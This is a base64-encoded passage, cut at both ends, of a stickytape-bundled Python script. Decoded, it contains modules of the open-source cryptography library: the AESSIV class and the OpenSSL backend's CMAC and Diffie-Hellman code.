CAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX2NoZWNrX3BhcmFtcyhub25jZSwgZGF0YSwgYXNzb2NpYXRlZF9kYXRhKVxyXG4gICAgICAgIHJldHVybiBhZWFkLl9lbmNyeXB0KGJhY2tlbmQsIHNlbGYsIG5vbmNlLCBkYXRhLCBbYXNzb2NpYXRlZF9kYXRhXSwgMTYpXHJcblxyXG4gICAgZGVmIGRlY3J5cHQoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBub25jZTogYnl0ZXMsXHJcbiAgICAgICAgZGF0YTogYnl0ZXMsXHJcbiAgICAgICAgYXNzb2NpYXRlZF9kYXRhOiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdLFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBpZiBhc3NvY2lhdGVkX2RhdGEgaXMgTm9uZTpcclxuICAgICAgICAgICAgYXNzb2NpYXRlZF9kYXRhID0gYiIiXHJcblxyXG4gICAgICAgIHNlbGYuX2NoZWNrX3BhcmFtcyhub25jZSwgZGF0YSwgYXNzb2NpYXRlZF9kYXRhKVxyXG4gICAgICAgIHJldHVybiBhZWFkLl9kZWNyeXB0KGJhY2tlbmQsIHNlbGYsIG5vbmNlLCBkYXRhLCBbYXNzb2NpYXRlZF9kYXRhXSwgMTYpXHJcblxyXG4gICAgZGVmIF9jaGVja19wYXJhbXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBub25jZTogYnl0ZXMsXHJcbiAgICAgICAgZGF0YTogYnl0ZXMsXHJcbiAgICAgICAgYXNzb2NpYXRlZF9kYXRhOiBieXRlcyxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICB1dGlscy5fY2hlY2tfYnl0ZXNsaWtlKCJub25jZSIsIG5vbmNlKVxyXG4gICAgICAgIHV0aWxzLl9jaGVja19ieXRlcygiZGF0YSIsIGRhdGEpXHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzKCJhc3NvY2lhdGVkX2RhdGEiLCBhc3NvY2lhdGVkX2RhdGEpXHJcbiAgICAgICAgaWYgbGVuKG5vbmNlKSA8IDEyIG9yIGxlbihub25jZSkgPiAxNTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiTm9uY2UgbXVzdCBiZSBiZXR3ZWVuIDEyIGFuZCAxNSBieXRlcyIpXHJcblxyXG5cclxuY2xhc3MgQUVTU0lWKG9iamVjdCk6XHJcbiAgICBfTUFYX1NJWkUgPSAyKiozMSAtIDFcclxuXHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwga2V5OiBieXRlcyk6XHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzbGlrZSgia2V5Iiwga2V5KVxyXG4gICAgICAgIGlmIGxlbihrZXkpIG5vdCBpbiAoMzIsIDQ4LCA2NCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkFFU1NJViBrZXkgbXVzdCBiZSAyNTYsIDM4NCwgb3IgNTEyIGJpdHMuIilcclxuXHJcbiAgICAgICAgc2VsZi5fa2V5ID0ga2V5XHJcblxyXG4gICAgICAgIGlmIG5vdCBiYWNrZW5kLmFlYWRfY2lwaGVyX3N1cHBvcnRlZChzZWxmKTpcclxuICAgICAgICAgICAgcmFpc2UgZXhjZXB0aW9ucy5VbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgICAgICJBRVMtU0lWIGlzIG5vdCBzdXBwb3J0ZWQgYnkgdGhpcyB2ZXJzaW9uIG9mIE9wZW5TU0wiLFxyXG4gICAgICAgICAgICAgICAgZXhjZXB0aW9ucy5fUmVhc29ucy5VTlNVUFBPUlRFRF9DSVBIRVIsXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICBAY2xhc3NtZXRob2RcclxuICAgIGRlZiBnZW5lcmF0ZV9rZXkoY2xzLCBiaXRfbGVuZ3RoOiBpbnQpIC0+IGJ5dGVzOlxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGJpdF9sZW5ndGgsIGludCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiYml0X2xlbmd0aCBtdXN0IGJlIGFuIGludGVnZXIiKVxyXG5cclxuICAgICAgICBpZiBiaXRfbGVuZ3RoIG5vdCBpbiAoMjU2LCAzODQsIDUxMik6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoImJpdF9sZW5ndGggbXVzdCBiZSAyNTYsIDM4NCwgb3IgNTEyIilcclxuXHJcbiAgICAgICAgcmV0dXJuIG9zLnVyYW5kb20oYml0X2xlbmd0aCAvLyA4KVxyXG5cclxuICAgIGRlZiBlbmNyeXB0KFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZGF0YTogYnl0ZXMsXHJcbiAgICAgICAgYXNzb2NpYXRlZF9kYXRhOiB0eXBpbmcuT3B0aW9uYWxbdHlwaW5nLkxpc3RbYnl0ZXNdXSxcclxuICAgICkgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgYXNzb2NpYXRlZF9kYXRhIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGFzc29jaWF0ZWRfZGF0YSA9IFtdXHJcblxyXG4gICAgICAgIHNlbGYuX2NoZWNrX3BhcmFtcyhkYXRhLCBhc3NvY2lhdGVkX2RhdGEpXHJcblxyXG4gICAgICAgIGlmIGxlbihkYXRhKSA+IHNlbGYuX01BWF9TSVpFIG9yIGFueShcclxuICAgICAgICAgICAgbGVuKGFkKSA+IHNlbGYuX01BWF9TSVpFIGZvciBhZCBpbiBhc3NvY2lhdGVkX2RhdGFcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICAjIFRoaXMgaXMgT3ZlcmZsb3dFcnJvciB0byBtYXRjaCB3aGF0IGNmZmkgd291bGQgcmFpc2VcclxuICAgICAgICAgICAgcmFpc2UgT3ZlcmZsb3dFcnJvcihcclxuICAgICAgICAgICAgICAgICJEYXRhIG9yIGFzc29jaWF0ZWQgZGF0YSB0b28gbG9uZy4gTWF4IDIqKjMxIC0gMSBieXRlcyJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gYWVhZC5fZW5jcnlwdChiYWNrZW5kLCBzZWxmLCBiIiIsIGRhdGEsIGFzc29jaWF0ZWRfZGF0YSwgMTYpXHJcblxyXG4gICAgZGVmIGRlY3J5cHQoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBkYXRhOiBieXRlcyxcclxuICAgICAgICBhc3NvY2lhdGVkX2RhdGE6IHR5cGluZy5PcHRpb25hbFt0eXBpbmcuTGlzdFtieXRlc11dLFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBpZiBhc3NvY2lhdGVkX2RhdGEgaXMgTm9uZTpcclxuICAgICAgICAgICAgYXNzb2NpYXRlZF9kYXRhID0gW11cclxuXHJcbiAgICAgICAgc2VsZi5fY2hlY2tfcGFyYW1zKGRhdGEsIGFzc29jaWF0ZWRfZGF0YSlcclxuXHJcbiAgICAgICAgcmV0dXJuIGFlYWQuX2RlY3J5cHQoYmFja2VuZCwgc2VsZiwgYiIiLCBkYXRhLCBhc3NvY2lhdGVkX2RhdGEsIDE2KVxyXG5cclxuICAgIGRlZiBfY2hlY2tfcGFyYW1zKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgZGF0YTogYnl0ZXMsXHJcbiAgICAgICAgYXNzb2NpYXRlZF9kYXRhOiB0eXBpbmcuTGlzdCxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICB1dGlscy5fY2hlY2tfYnl0ZXMoImRhdGEiLCBkYXRhKVxyXG4gICAgICAgIGlmIG5vdCBpc2luc3RhbmNlKGFzc29jaWF0ZWRfZGF0YSwgbGlzdCkgb3Igbm90IGFsbChcclxuICAgICAgICAgICAgaXNpbnN0YW5jZSh4LCBieXRlcykgZm9yIHggaW4gYXNzb2NpYXRlZF9kYXRhXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJhc3NvY2lhdGVkX2RhdGEgbXVzdCBiZSBhIGxpc3Qgb2YgYnl0ZXMgb3IgTm9uZSIpXHJcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjcnlwdG9ncmFwaHkvaGF6bWF0L2JhY2tlbmRzL29wZW5zc2wvY21hYy5weScsIGInIyBUaGlzIGZpbGUgaXMgZHVhbCBsaWNlbnNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uXHJcbiMgMi4wLCBhbmQgdGhlIEJTRCBMaWNlbnNlLiBTZWUgdGhlIExJQ0VOU0UgZmlsZSBpbiB0aGUgcm9vdCBvZiB0aGlzIHJlcG9zaXRvcnlcclxuIyBmb3IgY29tcGxldGUgZGV0YWlscy5cclxuXHJcbmltcG9ydCB0eXBpbmdcclxuXHJcbmZyb20gY3J5cHRvZ3JhcGh5LmV4Y2VwdGlvbnMgaW1wb3J0IChcclxuICAgIEludmFsaWRTaWduYXR1cmUsXHJcbiAgICBVbnN1cHBvcnRlZEFsZ29yaXRobSxcclxuICAgIF9SZWFzb25zLFxyXG4pXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzIGltcG9ydCBjb25zdGFudF90aW1lXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmNpcGhlcnMubW9kZXMgaW1wb3J0IENCQ1xyXG5cclxuaWYgdHlwaW5nLlRZUEVfQ0hFQ0tJTkc6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQucHJpbWl0aXZlcyBpbXBvcnQgY2lwaGVyc1xyXG4gICAgZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LmJhY2tlbmRzLm9wZW5zc2wuYmFja2VuZCBpbXBvcnQgQmFja2VuZFxyXG5cclxuXHJcbmNsYXNzIF9DTUFDQ29udGV4dDpcclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgIGJhY2tlbmQ6ICJCYWNrZW5kIixcclxuICAgICAgICBhbGdvcml0aG06ICJjaXBoZXJzLkJsb2NrQ2lwaGVyQWxnb3JpdGhtIixcclxuICAgICAgICBjdHg9Tm9uZSxcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgYmFja2VuZC5jbWFjX2FsZ29yaXRobV9zdXBwb3J0ZWQoYWxnb3JpdGhtKTpcclxuICAgICAgICAgICAgcmFpc2UgVW5zdXBwb3J0ZWRBbGdvcml0aG0oXHJcbiAgICAgICAgICAgICAgICAiVGhpcyBiYWNrZW5kIGRvZXMgbm90IHN1cHBvcnQgQ01BQy4iLFxyXG4gICAgICAgICAgICAgICAgX1JlYXNvbnMuVU5TVVBQT1JURURfQ0lQSEVSLFxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQgPSBiYWNrZW5kXHJcbiAgICAgICAgc2VsZi5fa2V5ID0gYWxnb3JpdGhtLmtleVxyXG4gICAgICAgIHNlbGYuX2FsZ29yaXRobSA9IGFsZ29yaXRobVxyXG4gICAgICAgIHNlbGYuX291dHB1dF9sZW5ndGggPSBhbGdvcml0aG0uYmxvY2tfc2l6ZSAvLyA4XHJcblxyXG4gICAgICAgIGlmIGN0eCBpcyBOb25lOlxyXG4gICAgICAgICAgICByZWdpc3RyeSA9IHNlbGYuX2JhY2tlbmQuX2NpcGhlcl9yZWdpc3RyeVxyXG4gICAgICAgICAgICBhZGFwdGVyID0gcmVnaXN0cnlbdHlwZShhbGdvcml0aG0pLCBDQkNdXHJcblxyXG4gICAgICAgICAgICBldnBfY2lwaGVyID0gYWRhcHRlcihzZWxmLl9iYWNrZW5kLCBhbGdvcml0aG0sIENCQylcclxuXHJcbiAgICAgICAgICAgIGN0eCA9IHNlbGYuX2JhY2tlbmQuX2xpYi5DTUFDX0NUWF9uZXcoKVxyXG5cclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChjdHggIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICAgICAgICAgIGN0eCA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5nYyhjdHgsIHNlbGYuX2JhY2tlbmQuX2xpYi5DTUFDX0NUWF9mcmVlKVxyXG5cclxuICAgICAgICAgICAga2V5X3B0ciA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5mcm9tX2J1ZmZlcihzZWxmLl9rZXkpXHJcbiAgICAgICAgICAgIHJlcyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5DTUFDX0luaXQoXHJcbiAgICAgICAgICAgICAgICBjdHgsXHJcbiAgICAgICAgICAgICAgICBrZXlfcHRyLFxyXG4gICAgICAgICAgICAgICAgbGVuKHNlbGYuX2tleSksXHJcbiAgICAgICAgICAgICAgICBldnBfY2lwaGVyLFxyXG4gICAgICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5fZmZpLk5VTEwsXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuXHJcbiAgICAgICAgc2VsZi5fY3R4ID0gY3R4XHJcblxyXG4gICAgZGVmIHVwZGF0ZShzZWxmLCBkYXRhOiBieXRlcykgLT4gTm9uZTpcclxuICAgICAgICByZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuQ01BQ19VcGRhdGUoc2VsZi5fY3R4LCBkYXRhLCBsZW4oZGF0YSkpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChyZXMgPT0gMSlcclxuXHJcbiAgICBkZWYgZmluYWxpemUoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgYnVmID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygidW5zaWduZWQgY2hhcltdIiwgc2VsZi5fb3V0cHV0X2xlbmd0aClcclxuICAgICAgICBsZW5ndGggPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJzaXplX3QgKiIsIHNlbGYuX291dHB1dF9sZW5ndGgpXHJcbiAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkNNQUNfRmluYWwoc2VsZi5fY3R4LCBidWYsIGxlbmd0aClcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHJlcyA9PSAxKVxyXG5cclxuICAgICAgICBzZWxmLl9jdHggPSBOb25lXHJcblxyXG4gICAgICAgIHJldHVybiBzZWxmLl9iYWNrZW5kLl9mZmkuYnVmZmVyKGJ1ZilbOl1cclxuXHJcbiAgICBkZWYgY29weShzZWxmKSAtPiAiX0NNQUNDb250ZXh0IjpcclxuICAgICAgICBjb3BpZWRfY3R4ID0gc2VsZi5fYmFja2VuZC5fbGliLkNNQUNfQ1RYX25ldygpXHJcbiAgICAgICAgY29waWVkX2N0eCA9IHNlbGYuX2JhY2tlbmQuX2ZmaS5nYyhcclxuICAgICAgICAgICAgY29waWVkX2N0eCwgc2VsZi5fYmFja2VuZC5fbGliLkNNQUNfQ1RYX2ZyZWVcclxuICAgICAgICApXHJcbiAgICAgICAgcmVzID0gc2VsZi5fYmFja2VuZC5fbGliLkNNQUNfQ1RYX2NvcHkoY29waWVkX2N0eCwgc2VsZi5fY3R4KVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgcmV0dXJuIF9DTUFDQ29udGV4dChzZWxmLl9iYWNrZW5kLCBzZWxmLl9hbGdvcml0aG0sIGN0eD1jb3BpZWRfY3R4KVxyXG5cclxuICAgIGRlZiB2ZXJpZnkoc2VsZiwgc2lnbmF0dXJlOiBieXRlcykgLT4gTm9uZTpcclxuICAgICAgICBkaWdlc3QgPSBzZWxmLmZpbmFsaXplKClcclxuICAgICAgICBpZiBub3QgY29uc3RhbnRfdGltZS5ieXRlc19lcShkaWdlc3QsIHNpZ25hdHVyZSk6XHJcbiAgICAgICAgICAgIHJhaXNlIEludmFsaWRTaWduYXR1cmUoIlNpZ25hdHVyZSBkaWQgbm90IG1hdGNoIGRpZ2VzdC4iKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9iYWNrZW5kcy9vcGVuc3NsL2RoLnB5JywgYicjIFRoaXMgZmlsZSBpcyBkdWFsIGxpY2Vuc2VkIHVuZGVyIHRoZSB0ZXJtcyBvZiB0aGUgQXBhY2hlIExpY2Vuc2UsIFZlcnNpb25cclxuIyAyLjAsIGFuZCB0aGUgQlNEIExpY2Vuc2UuIFNlZSB0aGUgTElDRU5TRSBmaWxlIGluIHRoZSByb290IG9mIHRoaXMgcmVwb3NpdG9yeVxyXG4jIGZvciBjb21wbGV0ZSBkZXRhaWxzLlxyXG5cclxuaW1wb3J0IHR5cGluZ1xyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkuZXhjZXB0aW9ucyBpbXBvcnQgVW5zdXBwb3J0ZWRBbGdvcml0aG0sIF9SZWFzb25zXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzIGltcG9ydCBzZXJpYWxpemF0aW9uXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmFzeW1tZXRyaWMgaW1wb3J0IGRoXHJcblxyXG5cclxuaWYgdHlwaW5nLlRZUEVfQ0hFQ0tJTkc6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBCYWNrZW5kXHJcblxyXG5cclxuZGVmIF9kaF9wYXJhbXNfZHVwKGRoX2NkYXRhLCBiYWNrZW5kOiAiQmFja2VuZCIpOlxyXG4gICAgbGliID0gYmFja2VuZC5fbGliXHJcbiAgICBmZmkgPSBiYWNrZW5kLl9mZmlcclxuXHJcbiAgICBwYXJhbV9jZGF0YSA9IGxpYi5ESHBhcmFtc19kdXAoZGhfY2RhdGEpXHJcbiAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHBhcmFtX2NkYXRhICE9IGZmaS5OVUxMKVxyXG4gICAgcGFyYW1fY2RhdGEgPSBmZmkuZ2MocGFyYW1fY2RhdGEsIGxpYi5ESF9mcmVlKVxyXG4gICAgaWYgbGliLkNSWVBUT0dSQVBIWV9JU19MSUJSRVNTTDpcclxuICAgICAgICAjIEluIGxpYnJlc3NsIERIcGFyYW1zX2R1cCBkb25cJ3QgY29weSBxXHJcbiAgICAgICAgcSA9IGZmaS5uZXcoIkJJR05VTSAqKiIpXHJcbiAgICAgICAgbGliLkRIX2dldDBfcHFnKGRoX2NkYXRhLCBmZmkuTlVMTCwgcSwgZmZpLk5VTEwpXHJcbiAgICAgICAgcV9kdXAgPSBsaWIuQk5fZHVwKHFbMF0pXHJcbiAgICAgICAgcmVzID0gbGliLkRIX3NldDBfcHFnKHBhcmFtX2NkYXRhLCBmZmkuTlVMTCwgcV9kdXAsIGZmaS5OVUxMKVxyXG4gICAgICAgIGJhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcblxyXG4gICAgcmV0dXJuIHBhcmFtX2NkYXRhXHJcblxyXG5cclxuZGVmIF9kaF9jZGF0YV90b19wYXJhbWV0ZXJzKGRoX2NkYXRhLCBiYWNrZW5kOiAiQmFja2VuZCIpIC0+ICJfREhQYXJhbWV0ZXJzIjpcclxuICAgIHBhcmFtX2NkYXRhID0gX2RoX3BhcmFtc19kdXAoZGhfY2RhdGEsIGJhY2tlbmQpXHJcbiAgICByZXR1cm4gX0RIUGFyYW1ldGVycyhiYWNrZW5kLCBwYXJhbV9jZGF0YSlcclxuXHJcblxyXG5jbGFzcyBfREhQYXJhbWV0ZXJzKGRoLkRIUGFyYW1ldGVycyk6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgYmFja2VuZDogIkJhY2tlbmQiLCBkaF9jZGF0YSk6XHJcbiAgICAgICAgc2VsZi5fYmFja2VuZCA9IGJhY2tlbmRcclxuICAgICAgICBzZWxmLl9kaF9jZGF0YSA9IGRoX2NkYXRhXHJcblxyXG4gICAgZGVmIHBhcmFtZXRlcl9udW1iZXJzKHNlbGYpIC0+IGRoLkRIUGFyYW1ldGVyTnVtYmVyczpcclxuICAgICAgICBwID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygiQklHTlVNICoqIilcclxuICAgICAgICBnID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygiQklHTlVNICoqIilcclxuICAgICAgICBxID0gc2VsZi5fYmFja2VuZC5fZmZpLm5ldygiQklHTlVNICoqIilcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLl9saWIuREhfZ2V0MF9wcWcoc2VsZi5fZGhfY2RhdGEsIHAsIHEsIGcpXHJcbiAgICAgICAgc2VsZi5fYmFja2VuZC5vcGVuc3NsX2Fzc2VydChwWzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQoZ1swXSAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTClcclxuICAgICAgICBxX3ZhbDogdHlwaW5nLk9wdGlvbmFsW2ludF1cclxuICAgICAgICBpZiBxWzBdID09IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMOlxyXG4gICAgICAgICAgICBxX3ZhbCA9IE5vbmVcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBxX3ZhbCA9IHNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChxWzBdKVxyXG4gICAgICAgIHJldHVybiBkaC5ESFBhcmFtZXRlck51bWJlcnMoXHJcbiAgICAgICAgICAgIHA9c2VsZi5fYmFja2VuZC5fYm5fdG9faW50KHBbMF0pLFxyXG4gICAgICAgICAgICBnPXNlbGYuX2JhY2tlbmQuX2JuX3RvX2ludChnWzBdKSxcclxuICAgICAgICAgICAgcT1xX3ZhbCxcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIGdlbmVyYXRlX3ByaXZhdGVfa2V5KHNlbGYpIC0+IGRoLkRIUHJpdmF0ZUtleTpcclxuICAgICAgICByZXR1cm4gc2VsZi5fYmFja2VuZC5nZW5lcmF0ZV9kaF9wcml2YXRlX2tleShzZWxmKVxyXG5cclxuICAgIGRlZiBwYXJhbWV0ZXJfYnl0ZXMoXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBlbmNvZGluZzogc2VyaWFsaXphdGlvbi5FbmNvZGluZyxcclxuICAgICAgICBmb3JtYXQ6IHNlcmlhbGl6YXRpb24uUGFyYW1ldGVyRm9ybWF0LFxyXG4gICAgKSAtPiBieXRlczpcclxuICAgICAgICBpZiBlbmNvZGluZyBpcyBzZXJpYWxpemF0aW9uLkVuY29kaW5nLk9wZW5TU0g6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiT3BlblNTSCBlbmNvZGluZyBpcyBub3Qgc3VwcG9ydGVkIilcclxuXHJcbiAgICAgICAgaWYgZm9ybWF0IGlzIG5vdCBzZXJpYWxpemF0aW9uLlBhcmFtZXRlckZvcm1hdC5QS0NTMzpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiT25seSBQS0NTMyBzZXJpYWxpemF0aW9uIGlzIHN1cHBvcnRlZCIpXHJcblxyXG4gICAgICAgIHEgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQuX2xpYi5ESF9nZXQwX3BxZyhcclxuICAgICAgICAgICAgc2VsZi5fZGhfY2RhdGEsIHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMLCBxLCBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTFxyXG4gICAgICAgIClcclxuICAgICAgICBpZiAoXHJcbiAgICAgICAgICAgIHFbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VTExcclxuICAgICAgICAgICAgYW5kIG5vdCBzZWxmLl9iYWNrZW5kLl9saWIuQ3J5cHRvZ3JhcGh5X0hBU19FVlBfUEtFWV9ESFhcclxuICAgICAgICApOlxyXG4gICAgICAgICAgICByYWlzZSBVbnN1cHBvcnRlZEFsZ29yaXRobShcclxuICAgICAgICAgICAgICAgICJESCBYOS40MiBzZXJpYWxpemF0aW9uIGlzIG5vdCBzdXBwb3J0ZWQiLFxyXG4gICAgICAgICAgICAgICAgX1JlYXNvbnMuVU5TVVBQT1JURURfU0VSSUFMSVpBVElPTixcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiBlbmNvZGluZyBpcyBzZXJpYWxpemF0aW9uLkVuY29kaW5nLlBFTTpcclxuICAgICAgICAgICAgaWYgcVswXSAhPSBzZWxmLl9iYWNrZW5kLl9mZmkuTlVMTDpcclxuICAgICAgICAgICAgICAgIHdyaXRlX2JpbyA9IHNlbGYuX2JhY2tlbmQuX2xpYi5QRU1fd3JpdGVfYmlvX0RIeHBhcmFtc1xyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgd3JpdGVfYmlvID0gc2VsZi5fYmFja2VuZC5fbGliLlBFTV93cml0ZV9iaW9fREhwYXJhbXNcclxuICAgICAgICBlbGlmIGVuY29kaW5nIGlzIHNlcmlhbGl6YXRpb24uRW5jb2RpbmcuREVSOlxyXG4gICAgICAgICAgICBpZiBxWzBdICE9IHNlbGYuX2JhY2tlbmQuX2ZmaS5OVUxMOlxyXG4gICAgICAgICAgICAgICAgd3JpdGVfYmlvID0gc2VsZi5fYmFja2VuZC5fbGliLkNyeXB0b2dyYXBoeV9pMmRfREh4cGFyYW1zX2Jpb1xyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgd3JpdGVfYmlvID0gc2VsZi5fYmFja2VuZC5fbGliLmkyZF9ESHBhcmFtc19iaW9cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoImVuY29kaW5nIG11c3QgYmUgYW4gaXRlbSBmcm9tIHRoZSBFbmNvZGluZyBlbnVtIilcclxuXHJcbiAgICAgICAgYmlvID0gc2VsZi5fYmFja2VuZC5fY3JlYXRlX21lbV9iaW9fZ2MoKVxyXG4gICAgICAgIHJlcyA9IHdyaXRlX2JpbyhiaW8sIHNlbGYuX2RoX2NkYXRhKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQub3BlbnNzbF9hc3NlcnQocmVzID09IDEpXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2JhY2tlbmQuX3JlYWRfbWVtX2JpbyhiaW8pXHJcblxyXG5cclxuZGVmIF9nZXRfZGhfbnVtX2JpdHMoYmFja2VuZCwgZGhfY2RhdGEpIC0+IGludDpcclxuICAgIHAgPSBiYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgYmFja2VuZC5fbGliLkRIX2dldDBfcHFnKGRoX2NkYXRhLCBwLCBiYWNrZW5kLl9mZmkuTlVMTCwgYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICBiYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHBbMF0gIT0gYmFja2VuZC5fZmZpLk5VTEwpXHJcbiAgICByZXR1cm4gYmFja2VuZC5fbGliLkJOX251bV9iaXRzKHBbMF0pXHJcblxyXG5cclxuY2xhc3MgX0RIUHJpdmF0ZUtleShkaC5ESFByaXZhdGVLZXkpOlxyXG4gICAgZGVmIF9faW5pdF9fKHNlbGYsIGJhY2tlbmQ6ICJCYWNrZW5kIiwgZGhfY2RhdGEsIGV2cF9wa2V5KTpcclxuICAgICAgICBzZWxmLl9iYWNrZW5kID0gYmFja2VuZFxyXG4gICAgICAgIHNlbGYuX2RoX2NkYXRhID0gZGhfY2RhdGFcclxuICAgICAgICBzZWxmLl9ldnBfcGtleSA9IGV2cF9wa2V5XHJcbiAgICAgICAgc2VsZi5fa2V5X3NpemVfYnl0ZXMgPSBzZWxmLl9iYWNrZW5kLl9saWIuREhfc2l6ZShkaF9jZGF0YSlcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBrZXlfc2l6ZShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgcmV0dXJuIF9nZXRfZGhfbnVtX2JpdHMoc2VsZi5fYmFja2VuZCwgc2VsZi5fZGhfY2RhdGEpXHJcblxyXG4gICAgZGVmIHByaXZhdGVfbnVtYmVycyhzZWxmKSAtPiBkaC5ESFByaXZhdGVOdW1iZXJzOlxyXG4gICAgICAgIHAgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIGcgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHEgPSBzZWxmLl9iYWNrZW5kLl9mZmkubmV3KCJCSUdOVU0gKioiKVxyXG4gICAgICAgIHNlbGYuX2JhY2tlbmQuX2xpYi5ESF9nZXQwX3BxZyhzZWxmLl9kaF9jZGF0YSwgcCwgcSwgZylcclxuICAgICAgICBzZWxmLl9iYWNrZW5kLm9wZW5zc2xfYXNzZXJ0KHBbMF0gIT0gc2VsZi5fYmFja2VuZC5fZmZpLk5VT